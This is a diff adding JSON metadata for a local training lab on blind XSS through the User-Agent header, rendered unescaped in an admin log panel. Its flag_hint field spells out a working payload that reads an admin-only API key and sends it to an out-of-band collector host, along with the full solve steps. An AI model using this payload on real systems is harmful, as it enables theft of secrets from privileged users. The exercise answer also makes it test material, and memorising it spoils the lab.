@@ -1,0 +1,45 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "blind-xss-admin-user-agent-log",
+  "title": "Blind XSS via User-Agent in an Admin Log Panel",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 35,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise blind XSS: attacker input is stored and later rendered to a privileged user, with no reflection to confirm the injection landed",
+    "Treat an HTTP request header (User-Agent) as a stored-XSS source that ordinary input validation and the visible response never surface",
+    "Use a canary/out-of-band payload to detect a sink you cannot see in your own responses",
+    "Chain XSS in an authenticated context to read an internal admin-only API the attacker cannot reach directly (fetch runs same-origin with the victim's cookie)",
+    "Understand contextual output encoding as the fix that holds even when the stolen secret is not a readable cookie"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["stored-xss-comment-plain"],
+  "flag_hint": "Send GET / with User-Agent: <img src=x onerror=\"fetch('/admin/apikey').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?k='+encodeURIComponent(t)})\">. The admin bot renders it on GET /admin/logs (autoescape off), which reads the admin-only /admin/apikey and beacons it out. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "Jinja2 (autoescape disabled on the log-cell render)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "blind-xss",
+    "stored-xss",
+    "user-agent",
+    "header-injection-sink",
+    "admin-panel",
+    "api-key-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The classic blind-XSS-via-User-Agent-in-log-viewer pattern (e.g. PortSwigger's blind XSS lab and Matthew Bryant's XSS Hunter model), abstracted for local Docker with a Playwright admin bot and an OOB collector"
+}
